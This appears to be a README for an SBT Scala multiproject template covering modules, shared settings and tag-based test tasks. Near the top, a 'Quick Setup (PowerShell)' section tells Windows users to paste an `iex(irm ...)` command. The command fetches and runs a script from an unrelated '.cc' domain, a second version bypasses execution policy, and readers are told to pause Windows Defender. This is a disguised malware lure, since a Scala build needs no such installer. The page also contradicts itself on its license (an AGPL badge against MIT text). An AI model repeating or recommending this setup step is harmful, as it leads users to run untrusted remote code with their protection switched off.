<div align="center">

# SBT Scala Multiproject — Starter Kit

![preview](https://raw.githubusercontent.com/WagnerSenaDeSouza/sbt-scala-multiproject-template/main/frame_5861.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-CORE-6366f1?style=plastic&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-PASSING-2ea44f?style=plastic&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-AGPL--3.0-818cf8?style=plastic&labelColor=0d1117)]()

</div>

---

A minimal SBT Scala multiproject template with an initial, opinionated configuration. It ships with two independent modules, a shared `common` project they both depend on, and preconfigured formatting, coverage, and style checks. Test tasks are split by tag so unit, functional, and integration suites can be run separately, with disabled tests filtered out by default. Use it as a starting point: swap in your own namespace, organization, and dependencies, then trim the defaults to fit your project.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Start PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Multi-module SBT layout with independent `first` and `second` modules sharing a `common` dependency.
- Common build settings centralized in `project/Settings.scala` and dependencies in `project/Dependencies.scala`.
- Scalariform formatting, Scalastyle checks, and Scoverage measurement preconfigured.
- Tag-based test tasks: `unit:test`, `functional:test`, and `integration:test` select tests by tag.
- Tests tagged as `DisabledTest` are automatically filtered out.
- Small build DSL for declaring modules, applying shared settings, wiring test dependencies, and setting initial console commands.
- Per-module overrides supported via each module's own build file.
- Defaults are strict but easy to relax inline with format, style, and coverage toggles.

## Tech Stack

- **SBT** — multiproject build with shared settings and per-module overrides
- **Scala** — configured compiler options and namespace conventions
- **Scalariform** — formatting rules applied across modules
- **Scalastyle** — style checks with a customizable rule set
- **Scoverage** — test coverage measurement and aggregated reports
- **Test tagging** — predefined `unit`, `functional`, and `integration` configurations plus filtered `disabled` tests
- **Multi-module layout** — independent `first` and `second` modules with a shared `common` dependency

## Project Structure

Modules live under `modules/` and are wired together in `build.sbt`:

- `first` — standalone module.
- `second` — standalone module.
- `common` — shared code, depended on by both `first` and `second`.

Supporting layout:

- `project/` — build plumbing:
 - `Settings.scala` — common settings, test configs, and the small module DSL.
 - `Dependencies.scala` — shared resolvers and library dependencies.
 - `plugins.sbt` — SBT plugins (formatting, coverage, style checks).
- `modules/<name>/build.sbt` — optional per-module overrides, applied on top of the shared defaults.

Each module's sources follow the standard SBT layout (`src/main/scala`, `src/test/scala`, plus dedicated directories for functional and integration tests). Tagged test suites are scoped through the predefined `unit:test`, `functional:test`, and `integration:test` tasks; tests marked as disabled are filtered out automatically.

When adding a module, create `modules/<name>` and register it in `build.sbt` with `project.from("<name>")`, then attach shared settings and test configurations using the existing entries as a template.

## Customization

Rename the root namespace in Scala sources and in `project/Settings.scala`, then update the organization name, version, and the initial `console` target.

`build.sbt` exposes a small DSL; use the existing modules as the pattern:

- `project.from("name")` builds a module from the `modules/name` directory and sets its SBT name.
- `setName("name")` and `setDescription("description")` set artifact name and description fluently.
- `setInitialCommand("command")` points `console` at `namespace.{command}`.
- `configureModule` applies the shared settings from `Settings.scala`.
- `configureUnitTests` / `configureFunctionalTests` / `configureIntegrationTests` add the corresponding tagged test tasks.
- `dependsOnProjects(projects)` wires compile and test dependencies, so tests run only when the module and its dependencies pass.

Each call returns a project, so plain `.settings(...)` still applies. Per-module tweaks can live in `modules/name/build.sbt`.

Review `project/Settings.scala` to adjust `scalacOptions`, formatting preferences, and `scalastyle-config.xml` defaults. Shared resolvers and dependencies belong in `project/Dependencies.scala`.

Once you understand the layout, delete template-only files and replace the README and LICENSE with your own.

## Usage

Use the template as a starting point, then adapt it to your own project. The typical flow:

1. Rename the module namespace everywhere it appears — both in Scala sources under `modules/` and in the shared settings inside `project/`.
2. Adjust the organization name and version number to match your artifact coordinates.
3. Review `project/Dependencies.scala` and update resolvers and dependencies as needed.
4. Add or remove modules in `build.sbt` using the existing projects as examples, then register each new module with the common settings and the test tasks it should expose.
5. Tune compiler options, formatter preferences, and style rules in the shared settings file and the style configuration file.

Each module lives in its own directory and can carry per-module settings in a local build file in addition to the shared configuration. Modules can depend on one another; test tasks for a module run only when its own tests and those of its dependencies pass.

Common commands:

```
sbt compile
sbt test
sbt clean test
sbt "project first" run
sbt first/test
sbt second/unit:test
```

Replace the sample projects and test tasks with whatever your own modules require. Once the initial editing is done, drop any leftover scaffolding files and supply your own README and license.

## License

This template is released under the MIT License. See the `LICENSE` file in the repository root for the full text.

In short: you may use, copy, modify, merge, publish, distribute, sublicense, and sell copies of this template and any derivative works, provided the copyright notice and permission notice are included in all copies or substantial portions of the software. The template is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.

When you bootstrap a project from this template, replace the copyright holder and year in the `LICENSE` file with your own details.